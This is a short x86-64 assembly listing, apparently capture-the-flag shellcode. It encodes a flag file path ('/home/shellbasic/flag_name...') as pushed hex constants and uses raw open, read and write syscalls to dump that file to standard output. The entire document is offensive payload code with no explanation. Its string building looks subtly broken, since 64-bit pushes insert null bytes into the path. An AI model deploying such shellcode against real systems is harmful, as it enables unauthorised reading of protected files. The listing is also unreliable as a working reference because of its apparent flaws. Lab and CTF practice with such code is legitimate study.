section .text
global _start

_start:
    mov rax, 0x676e6f6f
    push rax
    mov rax, 0x6f6f6f6f
    push rax
    mov rax, 0x6c5f7369
    push rax
    mov rax, 0x5f656d61
    push rax
    mov rax, 0x6e5f6761
    push rax
    mov rax, 0x6c662f63
    push rax
    mov rax, 0x69736162
    push rax
    mov rax, 0x5f6c6c65
    push rax
    mov rax, 0x68732f65
    push rax
    mov rax, 0x6d6f682f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall ;open(filename, O_RDONLY)

    mov rdi, rax
    mov rsi, rsp
    sub rsi, 0x29
    mov rdx, 0x29
    xor rax, rax
    syscall ;read(filename, buf, len)

    mov rax, 1
    mov rdi, 1
    syscall ;write(1, buf, len)
    